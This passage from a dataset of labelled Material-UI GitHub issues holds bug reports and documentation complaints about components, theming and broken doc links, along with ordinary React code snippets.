https://codesandbox.io/s/createreactapp-8gunw\r\n\r\n1. override the `expanded` class for the expansion panel\r\n2. note that only those attributes not specified by default are applied\r\n3. If switching versions to Material-UI v4.0.0-alpha.7, the issues away and behavior is as expected\r\n\r\n![image](https://user-images.githubusercontent.com/8051185/58921473-8a332900-86fc-11e9-991a-0abca5be862a.png)\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI'm trying to remove the margins added to expansion panels when they are expanded. \r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.0.2  |\r\n| React        |    latest     |\r\n| Browser      |     all    |\r\n| TypeScript   |   no     |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation"],"text":"When changing any Stripe input the InputBase.js produces an error in the dirtyCheck when trying to access the value of either the inputRef.current or target.value: `Cannot read property 'value' of undefined`\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nInput should update normally\r\n\r\n## Current Behavior 😯\r\nProduces error and prevents using input\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://codesandbox.io/s/createreactapp-1e4fe\r\n\r\n1. Enter a number\r\n2. Check the console for error, it should say `Cannot read property 'value' of undefined`\r\n\r\n## Context 🔦\r\nError causes inability to proceed in payment screen\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.0.2  |\r\n| React        |     v16.8.6    |\r\n| Browser      |    Chrome Version 74.0.3729.169     |\r\n| TypeScript   |    N/A     |\r\n| etc.         |         |\r\n\r\n\r\n![Screen Shot 2019-06-03 at 1 48 28 PM](https://user-images.githubusercontent.com/20974159/58826531-e4ee5700-860e-11e9-9d76-a522a6de9434.png)\r\n![Screen Shot 2019-06-03 at 1 48 41 PM](https://user-images.githubusercontent.com/20974159/58826532-e4ee5700-860e-11e9-8166-7a361d64b959.png)\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"\r\n<!--- Provide a general summary of the issue in the Title above -->\r\nTrying to search in the v3 docs keeps landing on pages that don't exist. This seems to happen for any page that has moved.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\nSearching the v3 docs for \"Typography\" should land me on https://v3-9-0.material-ui.com/style/typography/\r\n\r\n## Current Behavior 😯\r\n\r\nSearching the v3 docs for \"Typography\" lands me on a page that doesn't exist https://v3-9-0.material-ui.com/customization/typography/#typography\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\n\r\n1. Go to https://v3-9-0.material-ui.com/\r\n2. Search for Typography\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nThis is making it very difficult to use the v3 version of Material UI. While we would love to update to v4, that's not going to happen for a bit.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.x.x  |\r\n"},{"labels":["documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nI'll ignore the rest of the template because I believe that it isn't very helpful in this case as this isn't a code related issue.\r\n\r\nOld material-ui versions link to https://material-ui.com/style/typography#migration-to-typography-v2 when using old typography variants. However now that v4 is out and the Typography documentation page is rewritten this link is no longer valid.\r\nAs migrating to new Typography variants is a precursor to migrating to v4 IMHO this documentation is more important than ever.\r\n\r\nAs the old documentation is still reachable as https://v3-9-0.material-ui.com/style/typography/#migration-to-typography-v2 (and still is valid) or as part of the general v3 migration guide https://material-ui.com/guides/migration-v3/#typography I think that it would be a very nice experience if the old link was detected and redirected to one of the \"new\" locations."},{"labels":["documentation",null],"text":"Something like these:\r\n\r\n`theme.spacing(.5)` // = 4 \r\n\r\n`theme.spacing(.1, .2, .3, .4)` // = '0.8px 1.6px 2.4px 3.2px'\r\n\r\n[theme.spacing(.5, 1, 2, 3)](https://github.com/mui-org/material-ui/issues/14280)"},{"labels":["documentation",null],"text":"I have been using recompose/compose exactly like in the doc:\r\n\r\n[https://material-ui.com/components/hidden/](https://material-ui.com/components/hidden/)\r\n\r\nOnly the import was from 'recompose/compose' not 'docs/src/modules/utils/compose' (I have tried this too)\r\n\r\nBut don't work anymore maybe because of **Remove recompose dependency** ([#14479](https://github.com/mui-org/material-ui/pull/14479))\r\n\r\nWhat is the alternative of that?"},{"labels":["documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [X] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nHow to override the styling of e.g. all buttons on a page is documented well.\r\n\r\n## Current Behavior 😯\r\nIt is not documented well.\r\n\r\n## Steps to Reproduce 🕹\r\nI want to override the font-size of ALL buttons on the page. Of course I can create a custom component, but according to [here](https://material-ui.com/customization/components/#global-css-override) I can override styling of all components on a page.\r\n\r\nHowever, when I click on the link, it explains how class names are generated, and how to apply this *to an individual component*.\r\n\r\nSo it's unclear to me how I can globally inject those styles to make sure that e.g. all buttons have a larger font size."},{"labels":["documentation",null],"text":"Earlier themes were working fine before the 4.0 release but now the nested themes are overriding the themes which are outside its scope \r\nfor example in your documentation example https://codesandbox.io/s/material-demo-hdy1n\r\n\r\nreplace the demo.js code with the attached code in demo.txt file\r\n[demo.txt](https://github.com/mui-org/material-ui/files/3227313/demo.txt)\r\n\r\n\r\n\r\n\r\nThe theme of components outside the nested themes are getting overridden by the nested one.\r\nI am facing this challenge in my whole project as I have many nested themes and the ui has changed unexpectedly due to this,\r\nearlier it was working fine with v3.9\r\n"},{"labels":["documentation",null],"text":"Documentation showing '@material-ui/styles' rather than '@material-ui/core/styles'\r\n\r\n(notably in the theming section) "},{"labels":["documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nSample should work without making changes\r\n## Current Behavior 😯\r\nThe error `theme.spacing is not a function` occurs.\r\n\r\n\r\nNeed to change this line from `material-ui/styles` to `material-ui/core/styles`\r\nhttps://github.com/mui-org/material-ui/blob/master/docs/src/pages/getting-started/page-layout-examples/dashboard/Orders.js#L5"},{"labels":["documentation",null],"text":"How does one use the `makeStyles` API within a class component? The [documentation](https://material-ui.com/styles/basics/) only shows examples for function components.\r\n\r\nWhen I try to use this within a class component's `render` method, I get the following error:\r\n\r\n```\r\nInvalid hook call. Hooks can only be called inside of the body of a function component. This could happen for one of the following reasons:\r\n1. You might have mismatching versions of React and the renderer (such as React DOM)\r\n2. You might be breaking the Rules of Hooks\r\n3. You might have more than one copy of React in the same app\r\nSee https://fb.me/react-invalid-hook-call for tips about how to debug and fix this problem.\r\n```"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nI would like to take part in translating this project into Korean. I know Koreans aren't exactly the major population of users of this library but with all the startup booms like other countries and tendency to adopt React, I believe people will use this library much more actively if they could understand the documentation. It doesn't have to be now but whenever the admins think it's necessary, you can @ me.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe how it should work.\r\n-->\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Explain the difference from current behavior.\r\n-->\r\n\r\n## Examples 🌈\r\n<!---\r\n    Provide a link to the Material design specification, other implementations,\r\n    or screenshots of the expected behavior.\r\n-->\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has the lack of this feature affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nPreviously the code snippets were perfectly legible, they looked like this\r\n\r\n![v3 code snippet](https://i.imgur.com/yu7WV88.png)\r\n\r\nNow code snippets look like this which I find a lot harder to read and also visually less appealing\r\n\r\n![v4 code snippet](https://i.imgur.com/ZjIrDki.png) \r\n"},{"labels":[null,"documentation"],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nFinding the docs for your favorite component fast.\r\n- 😊: I looked for `Dialog`.\r\n- 🤓: Searched for D.\r\n- 👌🏻: Found it.\r\n\r\n## Current Behavior 😯\r\nScrolling up and down looking for the right component.\r\n- 😊: I looked for `Dialog`.\r\n- 🤔: Hmm, maybe its \"Data Display\" because I want to display the data in a modal.\r\n- 😱: Oh no, its not...\r\n- 🧐: Hmm, maybe its under \"Layout\", because a modal gives the screen a new layout.\r\n- 😕: Oh no, its neither.\r\n- 😒: Then it might be \"Surfaces\" because a Dialog creates a new surface.\r\n- 🥵: Its still not right?! \r\n- 😓: Let me try \"Feedback\".\r\n- 😣: Oh there it is.\r\n\r\n## Examples 🌈\r\n(Old) Good / Alphabetical:\r\n![Screenshot 2019-05-17 at 10 39 36](https://user-images.githubusercontent.com/31096420/57914994-1b4a7900-7890-11e9-9169-13ceeb97a073.png)\r\n\r\n\r\n(New) Bad / By feature\r\n![Screenshot 2019-05-17 at 10 39 15](https://user-images..com/31096420/57914992-17b6f200-7890-11e9-9457-a5733736c721.png)\r\n\r\n\r\n## Context 🔦\r\nFrequent Material-UI user here 👋🏻 I'm trying out the Beta and just wanted to give you the feedback that the new docs layout makes my Material-UI experience a little frustrating. Before the new drawer it was pleasant. With the new drawer I find myself scrolling up and down looking for the right component.\r\n\r\nI assume you ordered the components by feature to make it easier for new users to find what they are looking for. But for experienced users it makes it harder. Once you used the library a lot you have memorized most component names. But since they are no longer ordered alphabetically you would also have to know to which category they belong, causing to very slow finding of the documentation for the respective component.\r\n"},{"labels":["documentation",null],"text":"Took me a couple of hours before I found out why my code did not work but the v4 docs for theming typography contains a sneaky typo 👊 \r\n\r\nThe example code overrides should be @font-face, not @font-family:\r\n\r\n```js\r\nconst theme = createMuiTheme({\r\n  /* ... */\r\n  overrides: {\r\n    MuiCssBaseline: {\r\n      '@global': {\r\n         // '@font-family': [raleway],\r\n        '@font-face': [raleway],\r\n      },\r\n    },\r\n  },\r\n});\r\n```\r\n\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"When request to site https://material-ui.com/ resolve as plain text. Even v4 preview fails: https://next--material-ui.netlify.com/"},{"labels":["documentation",null],"text":"Hi!\r\n\r\nFirst of all, thank you for this great project. Really appreciate all the work and effort that has been put into the development of this project.\r\n\r\nRecently I've been seeing (and hearing) my CPU fans going crazy when using the documentation at [material-ui.com](https://material-ui.com). Not sure what the exact issue is, but according to the `Activity Monitor` on macOS, a service worker seems to be responsible.\r\n\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Steps to Reproduce 🕹\r\nUnfortunately, I don't have steps to reproduce this issue, however, it happens occasionally when I leave a tab with `material-ui.com` open for a longer amount of time. So far, I've had it happened about 2-3 times in the past 2-3 weeks. \r\n\r\nHere's a screenshot of the `Activity Monitor` when the issue happens: [https://imgur.com/ccYiNvn](https://imgur.com/ccYiNvn).\r\n\r\n## Your Environment 🌎\r\nmacOS 10.14.4\r\nSafari 12.1\r\n\r\nI've only been using Safari to browse the documentation, so I can't confirm whether it happens in Firefox, Chrome, and/or any other browser. I will say, however, that I've had this happen on multiple machines (2 to be exact) with the same OS and browser setup.\r\n\r\n---\r\n\r\nPlease let me know if there is a need for additional info or if there's something I can do to help debug this issue in the future when it happens. Thanks!"},{"labels":[null,"documentation"],"text":"When looking at component demos on https://next.material-ui.com, clicking the \"View the source on GitHub\" button results in a 404 page not found. Probably caused by #15603?"},{"labels":["documentation"],"text":"Propose few fixes in `snackbar.md`, `selects.md`, `dialogs.md` and `progress.md`"},{"labels":["documentation"],"text":"In npm there is 3.9.3 version published about a month ago https://www.npmjs.com/package/@material-ui/core/v/3.9.3\r\n\r\nBut there is not change log for that version in [`CHANGELOG.md`](https://github.com/mui-org/material-ui/blob/next/CHANGELOG.md)\r\n\r\nFound changes in 3.9.3 tag https://github.com/mui-org/material-ui/releases/tag/v3.9.3\r\nbut it would be nice to update CHANGELOG.md file"},{"labels":["documentation"],"text":"I upgraded my project from Material UI V3 to V4 (Beta).\r\n\r\nAfter the upgrade I changed my `withStyles` imports from:\r\n\r\n```js\r\nimport withStyles from '@material-ui/core/styles/withStyles';\r\n```\r\n\r\nto \r\n\r\n```js\r\nimport withStyles from '@material-ui/styles/withStyles';\r\n```\r\n\r\nNow I get the error message:\r\n\r\n```bash\r\nindex.js:1446 Warning: Material-UI: the `styles` argument provided is invalid.\r\nYou are providing a function without a theme in the context.\r\nOne of the parent elements needs to use a ThemeProvider.\r\n```\r\n\r\nDo you always have to use a `ThemeProvider` as of Material-UI 4? If yes, I think this should be mentioned in the docs somewhere. Before I think the was a default value supplied. At least my styles would work without having a `ThemeProvider`."},{"labels":[null,"documentation"],"text":"\r\n This is a v1.x issue (v0.x is no longer maintained).\r\n  I have searched the issues of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\n    We should be able to access and override the props of the ButtonBase element rendered by the listItem element when the props \"button\" is set as true, especially the ripple effect.\r\n\r\n\r\n## Current Behavior 😯\r\n\r\n    We cannot access and override at all the ButtonBase props in a listItem component with the button props.\r\n\r\n\r\n## Steps to Reproduce 🕹\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/lxvxrq0zlq\r\n\r\n\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.3  |\r\n\r\n"},{"labels":[null,"documentation"],"text":"## Expected Behavior 🤔\r\nThat the `Fade` component complains if it gets `children` that doesnt take the style prop. \r\n\r\n## Current Behavior 😯\r\nIf you give `Fade` an element that doesnt take and apply the `style` prop the `Fade` component does nothing.\r\n\r\nSee this codesandbox: https://codesandbox.io/s/n3z26zp6n0 There you can see the the component that returns a `React.Fragment` the root never fades but the one with a `div` does.\r\n\r\nHere are some suggestions/thoughts/options:\r\n\r\n- Validate that the element that it receives takes the `style` prop (via typescript types and/or prop-types)\r\n- Receive a `Component` prop and render that instead of receiving an element and doing [cloneElement](https://github.com/mui-org/material-ui/blob/next/packages/material-ui/src/Fade/Fade.js#L57-L67). I think there is some problems typing react elements, see [this](https://gist.github.com/karol-majewski/ccd0ddbf97864afdd837dd8b1ddc993f)\r\n- Output its own element (default to div and make it overridable?) to ensure that the style prop is applied\r\n- Take a render function that receives the style and have the user apply the style props (and other logic depending on the transition state it gets in its own callback function)."},{"labels":[null,"documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nThe demo should execute without issue.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nThe demo causes a warning to appear in the browser console: \r\n\r\n`Warning: react-swipeable-view: one of the children provided is invalid: null.\r\nWe are expecting a valid React Element`\r\n\r\n<img width=\"357\" alt=\"Screen Shot 2019-04-22 at 2 28 18 AM\" src=\"https://user-images.githubusercontent.com/44956/56486798-f50b0680-64a6-11e9-86ff-4300d297f1c5.png\">\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://material-ui.com/demos/steppers/\r\n\r\n1. Run code as provided in `react-swipeable-view` stepper demo.\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nLikely due to this code:\r\n```js\r\n  {Math.abs(activeStep - index) <= 2 ? (\r\n    <img className={classes.img} src={step.imgPath} alt={step.label} />\r\n  ) : null}\r\n```\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.3  |\r\n| React        | v16.8.6 |\r\n| Browser      | Chrome Mac 73.0.3683.103 (Official Build) (64-bit) |\r\n"},{"labels":["documentation",null],"text":"I'm developing a header with a Drawer and I customized the style with `withStyles()` to get responsive behavior. I don't know why, but the `transitionDuration` prop is not working and it's opening/closing instantly :( Is this a bug? Am I doing something wrong?\r\n\r\n### Highlighted code with the info that I said\r\n```javascript\r\n  render() {\r\n    let StyledDrawer;\r\n    if (this.state.width <= 500) {\r\n      // Mobile\r\n      StyledDrawer = withStyles({\r\n        paper: {\r\n          top: '71px',\r\n          width: '100%',\r\n          height: '100vh',\r\n        },\r\n      })(Drawer);\r\n    } else {\r\n      // PC\r\n      StyledDrawer = withStyles({\r\n        paper: {\r\n          top: '71px',\r\n          width: '22rem',\r\n          height: '89vh',\r\n        },\r\n      })(Drawer);\r\n    }\r\n\r\n    return (\r\n      <div onClick={ (e) => { e.stopPropagation(); } }>\r\n        <div id='drawer-container' className={css(styles.background)}>\r\n          <IconContext.Provider value={{ color: 'white', size: '23px' }}>\r\n            <FaListUl onClick={this.toggleDrawerStatus} className={`icon m-3 ${css(styles.menu)}`} />\r\n          </IconContext.Provider>\r\n          <div>\r\n            <img src={Logo} width='194px'/>\r\n          </div>\r\n          <div>\r\n            <IconContext.Provider value={{ color: 'white', size: '23px' }}>\r\n              <FaUser className='icon m-3' />\r\n            </IconContext.Provider>\r\n          </div>\r\n        </div>\r\n        <div style={{ position: 'relative', display: 'flex', alignItems: 'flex-end' }}>\r\n          <StyledDrawer\r\n            open={this.state.drawerStatus}\r\n            anchor='left'\r\n            variant='persistent'\r\n            transitionDuration={1000}\r\n            BackdropProps={{ style: { position: 'fixed' } }}\r\n            ModalProps={{\r\n              container: document.getElementById('drawer-container'),\r\n              style: { position: 'fixed' },\r\n            }}>\r\n            <Filters onCloseClick={ () => { this.setState({ drawerStatus: false }); } }/>\r\n          </StyledDrawer>\r\n        </div>\r\n      </div>\r\n    );\r\n  }\r\n```\r\n\r\n### Full component\r\n```javascript\r\nimport React from 'react';\r\nimport { StyleSheet, css } from 'aphrodite';\r\nimport { FaListUl, FaUser, FaAlignRight } from 'react-icons/fa';\r\nimport { IconContext } from 'react-icons';\r\nimport Logo from '../assets/imgs/Destinos.png';\r\nimport Drawer from '@material-ui/core/Drawer';\r\nimport { withStyles } from '@material-ui/core/styles';\r\nimport Filters from './Filters';\r\n\r\n\r\nclass Header extends React.Component {\r\n  constructor(props) {\r\n    super(props);\r\n\r\n    this.state = {\r\n      drawerStatus: false,\r\n    };\r\n    this.toggleDrawerStatus = this.toggleDrawerStatus.bind(this);\r\n    this.updateDimensions = this.updateDimensions.bind(this);\r\n    this.updateDimensions();\r\n  }\r\n\r\n  componentDidMount() {\r\n    window.addEventListener('resize', this.updateDimensions);\r\n  }\r\n\r\n  toggleDrawerStatus = () => {\r\n    this.setState({\r\n      drawerStatus: !this.state.drawerStatus,\r\n    });\r\n  }\r\n\r\n  updateDimensions() {\r\n    this.setState({\r\n      width: window.innerWidth,\r\n    });\r\n  }\r\n\r\n  render() {\r\n    let StyledDrawer;\r\n    if (this.state.width <= 500) {\r\n      // Mobile\r\n      StyledDrawer = withStyles({\r\n        paper: {\r\n          top: '71px',\r\n          width: '100%',\r\n          height: '100vh',\r\n        },\r\n      })(Drawer);\r\n    } else {\r\n      // PC\r\n      StyledDrawer = withStyles({\r\n        paper: {\r\n          top: '71px',\r\n          width: '22rem',\r\n          height: '89vh',\r\n        },\r\n      })(Drawer);\r\n    }\r\n\r\n    return (\r\n      <div onClick={ (e) => { e.stopPropagation(); } }>\r\n        <div id='drawer-container' className={css(styles.background)}>\r\n          <IconContext.Provider value={{ color: 'white', size: '23px' }}>\r\n            <FaListUl onClick={this.toggleDrawerStatus} className={`icon m-3 ${css(styles.menu)}`} />\r\n          </IconContext.Provider>\r\n          <div>\r\n            <img src={Logo} width='194px'/>\r\n          </div>\r\n          <div>\r\n            <IconContext.Provider value={{ color: 'white', size: '23px' }}>\r\n              <FaUser className='icon m-3' />\r\n            </IconContext.Provider>\r\n          </div>\r\n        </div>\r\n        <div style={{ position: 'relative', display: 'flex', alignItems: 'flex-end' }}>\r\n          <StyledDrawer\r\n            open={this.state.drawerStatus}\r\n            anchor='left'\r\n            variant='persistent'\r\n            enterTransitionDuration={1000}\r\n            BackdropProps={{ style: { position: 'fixed' } }}\r\n            ModalProps={{\r\n              container: document.getElementById('drawer-container'),\r\n              style: { position: 'fixed' },\r\n            }}>\r\n            <Filters onCloseClick={ () => { this.setState({ drawerStatus: false }); } }/>\r\n          </StyledDrawer>\r\n        </div>\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\n\r\nconst styles = StyleSheet.create({\r\n  background: {\r\n    // Atenção: Se for mexer no height do Header, é preciso mudar a altura dos dois drawers\r\n    height: '71px',\r\n    display: 'flex',\r\n    flex: 1,\r\n    flexDirection: 'row',\r\n    justifyContent: 'space-between',\r\n    backgroundImage: 'linear-gradient(to right, #c94283, #664d7f)',\r\n  },\r\n  menu: {\r\n    cursor: 'pointer',\r\n  },\r\n});\r\n\r\nexport default Header;\r\n```"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nModal should be static when you move your mouse in and out of the window\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behaviour.\r\n-->\r\nModal moves when you move your mouse in and out.\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/next/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:\r\n\r\n1. Visit https://next.material-ui.com/utils/modal/\r\n2. Open the Simple Modal demo\r\n3. Move your mouse out of the window\r\n4. Move your mouse back into the window\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | next  |\r\n| etc.         |         |\r\n"},{"labels":["documentation"],"text":"I'm opening this as an issue because it might be something that you'd be willing to add to the docs. I can make the doc updates myself.\r\n\r\nRight now I'm reviewing the Material Design official docs to figure out what type of transition I should use for a certain interaction. It would have been helpful to me if the MUI [Transitions](https://material-ui.com/utils/transitions/) doc briefly mentioned which type of transition each component maps to. For example, the [Slide](https://material-ui.com/utils/transitions/#slide) transition seems to map to [peer transitions](https://material.io/design/navigation/navigation-transitions.html#peer-transitions)."},{"labels":["documentation",null,null],"text":"I was using `Material UI` with `Apollo` and `Next.js`.\r\nPreviously I use the `StylesProvider` for the rendering in App Component. I pass `disableGeneration` as `true` to `StyleProvider` to perform Apollo Server-side rendering.\r\n\r\nI found that the new guide has been changed to `ServerStyleSheet`. `StylesProvider` has been changed to `sheets.collect`.\r\nI think it is not great to new a `ServerStyleSheet` and pass `sheets.collect` to App Component render function. I see the latest example use the `ServerStyleSheet` in the `document.tsx` instead of `app.tsx`.\r\n\r\nIf I do so, how could I pass `disableGeneration` during Apollo Server-side rendering? Do I need two ServerStyleSheet instance? If not, how to do that? \r\n\r\nAnd could the nextjs example be enhanced that we could dynamically change the theme color on client-side? I think it is a very common use-case, but its a bit tricky as we have to share the theme color in a memoized context."},{"labels":[null,"documentation",null],"text":"I'm reffering to the implementation code here: https://github.com/mui-org/material-ui/blob/next/packages/material-ui-lab/src/Slider/Slider.js\r\nCheck out this REPL: https://codesandbox.io/s/w65j3jmlr5\r\nthe Thumb -MuiSlider activated class is supposed to be `rgba(84, 78, 93, 0.16)`\r\nbut is returning as `rgba(156, 39, 176, 0.16)` (the primary color fade)\r\n\r\n```jsx\r\n\r\n    sliderThumb: 